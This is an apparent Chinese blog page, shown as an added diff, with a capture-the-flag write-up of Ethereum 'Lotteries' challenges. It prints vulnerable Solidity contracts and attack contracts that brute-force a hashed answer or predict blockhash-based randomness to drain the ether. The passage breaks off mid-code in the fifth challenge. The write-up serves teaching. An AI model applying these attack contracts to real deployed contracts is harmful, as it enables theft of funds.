@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"mouke180.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.13.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="在以下每个挑战中，我们的目标是在guess时正确猜测答案 第一题：Guess the number代码：1234567891011121314151617contract GuessTheNumberChallenge &amp;#123;    uint8 answer &#x3D; 42;    function GuessTheNumberChallenge() public payable &amp;#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Lotteries">
+<meta property="og:url" content="https://mouke180.github.io/2022/11/28/Lotteries/index.html">
+<meta property="og:site_name" content="Yuki&#39;s Blog">
+<meta property="og:description" content="在以下每个挑战中，我们的目标是在guess时正确猜测答案 第一题：Guess the number代码：1234567891011121314151617contract GuessTheNumberChallenge &amp;#123;    uint8 answer &#x3D; 42;    function GuessTheNumberChallenge() public payable &amp;#123;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://mouke180.github.io/2022/11/28/Lotteries/%E5%9B%BE%E7%89%871.png">
+<meta property="og:image" content="https://mouke180.github.io/2022/11/28/Lotteries/%E5%9B%BE%E7%89%872.png">
+<meta property="og:image" content="https://mouke180.github.io/2022/11/28/Lotteries/%E5%9B%BE%E7%89%873.png">
+<meta property="og:image" content="https://mouke180.github.io/2022/11/28/Lotteries/%E5%9B%BE%E7%89%874.png">
+<meta property="og:image" content="https://mouke180.github.io/2022/11/28/Lotteries/%E5%9B%BE%E7%89%875.png">
+<meta property="og:image" content="https://mouke180.github.io/2022/11/28/Lotteries/%E5%9B%BE%E7%89%876.png">
+<meta property="article:published_time" content="2022-11-28T12:56:32.000Z">
+<meta property="article:modified_time" content="2022-11-28T13:09:06.568Z">
+<meta property="article:author" content="Yuki">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mouke180.github.io/2022/11/28/Lotteries/%E5%9B%BE%E7%89%871.png">
+
+
+<link rel="canonical" href="https://mouke180.github.io/2022/11/28/Lotteries/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://mouke180.github.io/2022/11/28/Lotteries/","path":"2022/11/28/Lotteries/","title":"Lotteries"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Lotteries | Yuki's Blog</title>
+  
+
+
+
+
+
+
+  <script async defer data-website-id="" src=""></script>
+
+  <script defer data-domain="" src=""></script>
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Yuki's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Love zhu</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E4%BB%A5%E4%B8%8B%E6%AF%8F%E4%B8%AA%E6%8C%91%E6%88%98%E4%B8%AD%EF%BC%8C%E6%88%91%E4%BB%AC%E7%9A%84%E7%9B%AE%E6%A0%87%E6%98%AF%E5%9C%A8guess%E6%97%B6%E6%AD%A3%E7%A1%AE%E7%8C%9C%E6%B5%8B%E7%AD%94%E6%A1%88"><span class="nav-number">1.</span> <span class="nav-text">在以下每个挑战中，我们的目标是在guess时正确猜测答案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%A2%98%EF%BC%9AGuess-the-number"><span class="nav-number"></span> <span class="nav-text">第一题：Guess the number</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">代码：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%A2%98%EF%BC%9AGuess-the-secret-number"><span class="nav-number"></span> <span class="nav-text">第二题：Guess the secret number</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%EF%BC%9A-1"><span class="nav-number">1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">攻击代码：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E9%A2%98%EF%BC%9AGuess-the-Random-number"><span class="nav-number"></span> <span class="nav-text">第三题：Guess the Random number</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%EF%BC%9A-2"><span class="nav-number">1.</span> <span class="nav-text">代码：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E9%A2%98%EF%BC%9AGuess-the-New-number"><span class="nav-number"></span> <span class="nav-text">第四题：Guess the New number</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%EF%BC%9A-3"><span class="nav-number">1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">攻击函数：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E9%A2%98%EF%BC%9APredict-the-future"><span class="nav-number"></span> <span class="nav-text">第五题：Predict the future</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%EF%BC%9A-4"><span class="nav-number">1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">攻击合约：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%85%AD%E9%A2%98%EF%BC%9AGuess-the-Hash-Number"><span class="nav-number"></span> <span class="nav-text">第六题：Guess the Hash Number</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%EF%BC%9A-5"><span class="nav-number">1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%EF%BC%9A-1"><span class="nav-number">2.</span> <span class="nav-text">攻击代码：</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Yuki</p>
+  <div class="site-description" itemprop="description">Happy Everyday</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mouke180.github.io/2022/11/28/Lotteries/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yuki">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yuki's Blog">
+      <meta itemprop="description" content="Happy Everyday">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Lotteries | Yuki's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Lotteries
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-11-28 20:56:32 / 修改时间：21:09:06" itemprop="dateCreated datePublished" datetime="2022-11-28T20:56:32+08:00">2022-11-28</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <blockquote>
+<h3 id="在以下每个挑战中，我们的目标是在guess时正确猜测答案"><a href="#在以下每个挑战中，我们的目标是在guess时正确猜测答案" class="headerlink" title="在以下每个挑战中，我们的目标是在guess时正确猜测答案"></a>在以下每个挑战中，我们的目标是在guess时正确猜测答案</h3></blockquote>
+<h2 id="第一题：Guess-the-number"><a href="#第一题：Guess-the-number" class="headerlink" title="第一题：Guess the number"></a>第一题：Guess the number</h2><h3 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract <span class="title class_">GuessTheNumberChallenge</span> &#123;</span><br><span class="line">    uint8 answer = <span class="number">42</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">GuessTheNumberChallenge</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">guess</span>(<span class="params">uint8 n</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">        <span class="keyword">if</span> (n == answer) &#123;</span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>题目中直接给出了要猜测的数字是 42 ，部署合约输入 42 即可。</p>
+<h2 id="第二题：Guess-the-secret-number"><a href="#第二题：Guess-the-secret-number" class="headerlink" title="第二题：Guess the secret number"></a>第二题：Guess the secret number</h2><h3 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract <span class="title class_">GuessTheSecretNumberChallenge</span> &#123;</span><br><span class="line">    bytes32 answerHash = <span class="number">0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">GuessTheSecretNumberChallenge</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">guess</span>(<span class="params">uint8 n</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">keccak256</span>(n) == answerHash) &#123;</span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>要求我们给出一个 uint8 类型的数字的 hash 值等于题目给的answerHash，因为uint8最大也不过 255 ，所以我们可以用枚举法写一个 for 循环一个一个来判断。</p>
+<h3 id="攻击代码："><a href="#攻击代码：" class="headerlink" title="攻击代码："></a>攻击代码：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract <span class="title class_">GuessTheSecretNumberChallenge</span> &#123;</span><br><span class="line">    bytes32 answerHash = <span class="number">0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</span>;</span><br><span class="line">uint8 public answer;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">guess</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="keyword">for</span>(uint8 i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_">keccak256</span>(i) == answerHash) &#123;</span><br><span class="line">                answer = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>部署合约，输入 answer 即可。</p>
+<h2 id="第三题：Guess-the-Random-number"><a href="#第三题：Guess-the-Random-number" class="headerlink" title="第三题：Guess the Random number"></a>第三题：Guess the Random number</h2><h3 id="代码：-2"><a href="#代码：-2" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">contract <span class="title class_">GuessTheRandomNumberChallenge</span> &#123;</span><br><span class="line">uint8 answer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">GuessTheRandomNumberChallenge</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">        answer = <span class="title function_">uint8</span>(<span class="title function_">keccak256</span>(block.<span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>), now));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">guess</span>(<span class="params">uint8 n</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">        <span class="keyword">if</span> (n == answer) &#123;</span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这道题answer在我们部署合约时由 block.number 以及 now 生成， block.number 是部署合约时的区块高度，很容易获得， now 是当前的时间戳，这是个比较麻烦的地方，我们可以使用 injected provider 在 remix 中使用的我们的 metamask 钱包部署合约。题目的 1 ether 太高了，我们可以自行降低，这里我用的 0.001 ether 即 1 Finny。</p>
+<p>部署了合约之后，我们可以去区块链浏览器上查看合约的情况，点击 view on etherscan：</p>
+<p>可以看到当前交易的信息：<img src="/2022/11/28/Lotteries/%E5%9B%BE%E7%89%871.png" class=""></p>
+<p>点击 State ，第二个 address 就是我们合约的地址，点击旁边的箭头就可以看见合约中有一个 storage 变量的变化，answer 就是 99：<img src="/2022/11/28/Lotteries/%E5%9B%BE%E7%89%872.png" class=""></p>
+<p>输入答案99即可：<img src="/2022/11/28/Lotteries/%E5%9B%BE%E7%89%873.png" class=""></p>
+<h2 id="第四题：Guess-the-New-number"><a href="#第四题：Guess-the-New-number" class="headerlink" title="第四题：Guess the New number"></a>第四题：Guess the New number</h2><h3 id="代码：-3"><a href="#代码：-3" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract <span class="title class_">GuessTheNewNumberChallenge</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">GuessTheNewNumberChallenge</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">0.001</span> ether);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">guess</span>(<span class="params">uint8 n</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">0.001</span> ether);</span><br><span class="line">        uint8 answer = <span class="title function_">uint8</span>(<span class="title function_">keccak256</span>(block.<span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>), now));</span><br><span class="line">        <span class="keyword">if</span> (n == answer) &#123;</span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="number">0.002</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这道题answer变成了在我们运行guess函数时生成，上一题的方法就不行了，我们可以写一个攻击函数，构造一个answer，然后从攻击函数来调用guess函数。</p>
+<h3 id="攻击函数："><a href="#攻击函数：" class="headerlink" title="攻击函数："></a>攻击函数：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;./GuessTheNewNumber.sol&quot;</span>;</span><br><span class="line">contract <span class="title class_">Poc</span> &#123;</span><br><span class="line"><span class="title class_">GuessTheNewNumberChallenge</span> target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">pwn</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        uint8 answer = <span class="title function_">uint8</span>(<span class="title function_">keccak256</span>(block.<span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>), now));</span><br><span class="line">        target.<span class="property">guess</span>.<span class="title function_">value</span>(<span class="number">0.001</span> ether)(answer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">poc</span>(<span class="params">address _addr</span>) public &#123;</span><br><span class="line">        target = <span class="title class_">GuessTheNewNumberChallenge</span>(_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> (<span class="params"></span>) public payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过pwn函数我们生成了一个answer，它和目标合约中的guess函数中的answer是同时生成的，然后调用目标合约的guess函数，传入答案answer，金额是0.001 ether，目的是通过guess函数的require。<br>部署合约，调用pwn函数即可：<img src="/2022/11/28/Lotteries/%E5%9B%BE%E7%89%874.png" class=""> <img src="/2022/11/28/Lotteries/%E5%9B%BE%E7%89%875.png" class=""></p>
+<p>攻击完成</p>
+<h2 id="第五题：Predict-the-future"><a href="#第五题：Predict-the-future" class="headerlink" title="第五题：Predict the future"></a>第五题：Predict the future</h2><h3 id="代码：-4"><a href="#代码：-4" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line">contract <span class="title class_">PredictTheFutureChallenge</span> &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    uint8 guess;</span><br><span class="line">uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">PredictTheFutureChallenge</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">0.001</span> ether);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">lockInGuess</span>(<span class="params">uint8 n</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(guesser == <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">        guesser = msg.<span class="property">sender</span>;</span><br><span class="line">        guess = n;</span><br><span class="line">        settlementBlockNumber = block.<span class="property">number</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">settle</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == guesser);</span><br><span class="line">        <span class="built_in">require</span>(block.<span class="property">number</span> &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        uint8 answer = <span class="title function_">uint8</span>(<span class="title function_">keccak256</span>(block.<span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>), now)) % <span class="number">10</span>;</span><br><span class="line">        guesser = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (guess == answer) &#123;</span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这道题answer的生成方式和上一题一样，依然是利用block.number和now来生产，但是猜测的范围变成了0 - 10，不同于上题的是它需要我们先通过lockInGuess函数设置一个我们猜测的数字guess，也就是我们猜测的数字是确定的，但是answer变化的，所以我们可以构造一个合约，当我们设置的guess和当前的answer相同的时候再执行settle函数。</p>
+<h3 id="攻击合约："><a href="#攻击合约：" class="headerlink" title="攻击合约："></a>攻击合约：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;./PredictTheFuture.sol&quot;</span>;</span><br><span class="line">contract attack &#123;</span><br><span class="line">    <span class="title class_">PredictTheFutureChallenge</span> challenge;</span><br><span class="line">uint8 <span class="title class_">Myguess</span> = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _addr</span>) public &#123;</span><br><span class="line">        challenge = <span class="title class_">PredictTheFutureChallenge</span>(_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">gue</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        challenge.<span class="property">lockInGuess</span>.<span class="title function_">value</span>(msg.<span class="property">value</span>)(<span class="title class_">Myguess</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">set</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span 